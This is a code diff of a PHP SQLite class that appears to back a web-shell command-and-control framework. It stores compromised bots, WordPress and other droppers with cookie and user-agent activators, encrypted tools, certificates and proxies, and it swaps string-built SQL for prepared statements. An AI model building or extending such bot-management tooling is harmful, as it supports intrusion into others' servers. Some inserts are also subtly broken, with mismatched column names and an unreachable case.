@@ -32,7 +32,7 @@ class slopSqlite extends \SQLite3
         $current_host = $_SERVER['HTTP_HOST'] ?? "localhost";
         $prepare_tables = [
             "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL DEFAULT '/slopshell.php', uuid TEXT UNIQUE NOT NULL, os_flavor TEXT NOT NULL, check_in INTEGER DEFAULT 0 NOT NULL, agent TEXT NOT NULL DEFAULT 'sp/1.1', cname TEXT NOT NULL DEFAULT '-', cvalue TEXT NOT NULL DEFAULT '-');",
-            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL, post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1', dropper_type TEXT NOT NULL DEFAULT '-');",
+            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL, post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1', dropper_type TEXT NOT NULL DEFAULT '-', uuid TEXT UNIQUE NOT NULL, activator TEXT NOT NULL DEFAULT '-');",
             "tools" => "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,tool_name TEXT UNIQUE NOT NULL,target TEXT NOT NULL,base64_encoded_tool TEXT UNIQUE NOT NULL,keys TEXT UNIQUE,tags TEXT UNIQUE,iv TEXT UNIQUE,cipher TEXT NOT NULL DEFAULT 'NONE',hmac_hash TEXT UNIQUE,lang TEXT NOT NULL,is_encrypted BOOLEAN DEFAULT false);",
             "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,cert_location_on_disk TEXT UNIQUE NOT NULL,base64_encoded_cert TEXT UNIQUE NOT NULL,csr TEXT UNIQUE,pub TEXT UNIQUE,pem TEXT UNIQUE,cipher TEXT DEFAULT '-',is_encrypted BOOLEAN DEFAULT FALSE,priv_key_pass TEXT UNIQUE NOT NULL,rotated BOOLEAN NOT NULL DEFAULT FALSE);",
         ];
@@ -45,112 +45,128 @@ class slopSqlite extends \SQLite3
         }
         return $success_list;
     }
-    public function insertData(array $data): bool{
-        switch ($data["action"]){
-            case str_contains($data['action'], "add_press") !== false:
-                $this->exec(sprintf("INSERT INTO sloppy_wordpress(zip_file, activation_word) VALUES ('%s', '%s');", $data['zip'], $data['activator']));
-                return true;
-            case str_contains($data['action'], "add_bot"):
-                try{
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in) VALUES ('%s', '%s', '%s', '%s', '%s');",
-                        $data['rhost'],
-                        $this->quote($data['uri']),
-                        $this->quote($data['uuid']),
-                        $this->quote($data['os_flavor']),
-                        $this->quote($data['check_in']) ?? 1
-                    ));
-                    return true;
-                }catch (PDOException $e){
-                    print("Insert main table Error: " . $this->lastErrorMsg() . PHP_EOL);
+
+    private function insertPress($data): bool
+    {
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, cookie_val, user_agent, uuid, dropper_type) VALUES (:location_on_disk,:cookiename,:cookie_val,:user_agent,:uuid,:dropper_type)");
+        return $stmt->execute([
+                'location_on_disk' => $data['zip'],
+                'cookiename' => $data['CookieName'],
+                'cookie_val' => $data['CookieVal'],
+                'user_agent' => $data['AllowedAgent'],
+                'uuid' => $data['UUID'],
+                'dropper_type' => 'wordpress'
+                ]) !== false;
+    }
+
+    private function insertBot($data): bool
+    {
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in) 
+                                VALUES (:rhost, :uri, :uuid, :os_flavor, :check_in);");
+        return $stmt->execute([
+                'rhost' => $data['rhost'],
+                'uri' => $data['uri'],
+                'uuid' => $data['uuid'],
+                'os_flavor' => $data['os_flavor'],
+                'check_in' => $data['check_in'] ?? 1
+            ]) !== false;
+    }
+
+    private function insertDropper( array $data ): bool
+    {
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, user_agent, dropper_type, post_var, activator) VALUES(:location_on_disk,:cookiename,:user_agent,:dropper_type,:post_var,:activator);");
+        return $stmt->execute([
+                'location_on_disk' => $data['dropper'],
+                'cookiename' => $data['cookie_name'],
+                'user_agent' => $data['user_agent'],
+                'dropper_type' => 'slim_boy',
+                'post_var' => $data['post_variable'],
+                'activator' => $data['activator']
+                ]) !== false;
+    }
+
+    private function insertCertificate(array $data): bool
+    {
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES (:cert_loc, :b64_cert, :csr, :pub, :pem, :cipher, :encrypted, :password)");
+        return $stmt->execute([
+            'cert_loc' => $data['cert_location'],
+            'b64_cert' =>$data['base64_data'],
+            'csr' => $data['csr'],
+            'pub' => $data['pub'],
+            'pem' => $data['pem'],
+            'cipher' => $data['cipher'],
+            'encrypted' => $data['is_encrypted'],
+            'password' => $data['priv_key_pass']
+        ]) !== false;
+    }
+
+    private function insertProxy(array $data): bool
+    {
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES(:schema, :proxy);");
+        return $stmt->execute([
+                'schema' => $data['proxy_schema'],
+                'proxy' => $data['proxy']
+        ]) !== false;
+    }
+
+    private function insertEncryptedTool(array $data): bool
+    {
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES(:tool_name, :target, :b64_encrypted, :keys, :tags, :iv, :cipher, :hmac_hash, :lang, :is_encrypted);");
+        return $stmt->execute([
+            'tool_name'=> $data['tool_name'],
+            'target' => $data['target'],
+            'b64_encrypted' => $data['base64_data'],
+            'keys' => $data['key'],
+            'tags' => $data['tag'],
+            'iv' => $data['iv'],
+            'cipher' => $data['cipher'],
+            'hmac_hash' => $data['hmac_hash'],
+            'lang' => $data['lang'],
+            'is_encrypted' => $data['is_encrypted']
+        ]) !== false;
+    }
+
+    private function insertTool(array $data): bool
+    {
+        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES(:tool_name, :target, :b64_encoded, :lang, :encrypted);");
+        return $stmt->execute([
+            'tool_name' => $data['tool_name'],
+            'target' => $data['target'],
+            'b64_encoded' => $data['base64_data'],
+            'lang' => $data['lang'],
+            'encrypted' => $data['is_encrypted']
+        ]);
+    }
+    public function insertData(array $data): bool
+    {
+        if (empty($data['action'])) {
+            print("Action is empty, cannot handle this.");
+            return false;
+        }
+
+        try{
+            switch (true) {
+                case str_contains($data['action'], "add_press"):
+                    return $this->insertPress($data);
+                case str_contains($data['action'], "add_bot"):
+                    return $this->insertBot($data);
+                case str_contains($data['action'], 'add_tool'):
+                    return $this->insertTool($data);
+                case str_contains($data['action'], "add_tool_encrypted"):
+                    return $this->insertEncryptedTool($data);
+                case str_contains($data['action'], 'add_cert'):
+                    return $this->insertCertificate($data);
+                case str_contains($data['action'], 'add_dropper'):
+                    return $this->insertDropper($data);
+                case str_contains($data['action'], 'proxies'):
+                    return $this->insertProxy($data);
+                default:
+                    print("Action was invalid, cannot handle this.");
                     return false;
-                }
-            case str_contains($data['action'], "add_dropper"):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_slim_droppers(location_on_disk, post_var, cookiename, user_agent) VALUES('%s', '%s', '%s', '%s');",
-                        $data['location_on_disk'],
-                        $data['post_var'],
-                        $data['cookiename'],
-                        $data['user_agent']
-                    ));
-                    return true;
-                }catch (PDOException $e){
-                    print("Insert dropper Error: " . $this->lastErrorMsg() . PHP_EOL);
-                    return false;
-                }
-            case str_contains($data['action'], 'add_cert'):
-                try{
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s');",
-                        $data['cert_location'],
-                        $data['base64_data'],
-                        $data['csr'],
-                        $data['pub'],
-                        $data['pem'],
-                        $data['cipher'],
-                        $data['is_encrypted'],
-                        $data['priv_key_pass']
-                    ));
-                    return true;
-                }catch (PDOException $e){
-                    print("Insert certificate error: " . $this->lastErrorMsg() . PHP_EOL);
-                    return false;
-                }
-            case str_contains($data['action'], "proxies"):
-                try{
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES('%s', '%s');",
-                        $data['proxy_schema'],
-                        $data['proxy']
-                    ));
-                    return true;
-                }catch (PDOException $e){
-                    print("Insert proxy error: " . $this->lastErrorMsg() . PHP_EOL);
-                    return false;
-                }
-            case str_contains($data['action'], "add_tool_encrypted"):
-                try{
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s');",
-                        $data['tool_name'],
-                        $data['target'],
-                        $data['base64_data'],
-                        $data['key'],
-                        $data['tag'],
-                        $data['iv'],
-                        $data['cipher'],
-                        $data['hmac_hash'],
-                        $data['lang'],
-                        $data['is_encrypted']
-                    ));
-                    return true;
-                }catch (PDOException $e){
-                    print("Insert encrypted tool error: " . $this->lastErrorMsg() . PHP_EOL);
-                    return false;
-                }
-            case str_contains($data['action'], "add_tool"):
-                try{
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES('%s','%s','%s','%s', '%s');",
-                        $data['tool_name'],
-                        $data['target'],
-                        $data['base64_data'],
-                        $data['lang'],
-                        $data['is_encrypted']
-                    ));
-                    return true;
-                }catch (PDOException $e){
-                    print("Insert tool error: " . $this->lastErrorMsg() . PHP_EOL);
-                    return false;
-                }
-            case str_contains($data['action'], "add_domain"):
-                try{
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_domains(from_domain) VALUES('%s');",
-                        $data['domain_name']
-                    ));
-                    return true;
-                }catch (PDOException $e){
-                    print("Insert domain error: " . $this->lastErrorMsg() . PHP_EOL);
-                    return false;
-                }
-            default:
-                print("Action was empty, cannot handle this.");
-                return false;
+            }
+        } catch (PDOException $e){
+            error_log($e->getMessage());
+            return false;
         }
     }
 
